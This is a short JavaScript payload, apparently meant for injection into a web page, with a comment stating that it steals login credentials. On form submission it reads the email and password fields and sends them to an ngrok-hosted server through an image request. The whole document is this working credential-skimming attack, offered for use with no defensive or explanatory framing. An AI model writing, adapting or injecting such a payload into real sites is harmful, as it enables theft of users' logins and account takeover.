// Description: This steals the login credentials and tunnels it to a remote server running on ngrok

<script>
function InterceptForms() {
var email = document.forms[0].elements[0].value;
var password = document.forms[0].elements[1].value;

new Image().src = "https://6824-102-89-47-45.ngrok-free.app/?="+encodeURIComponent(email)+"&password"+encodeURIComponent(password);
}
document.forms[0].onsubmit = InterceptForms;
</script>
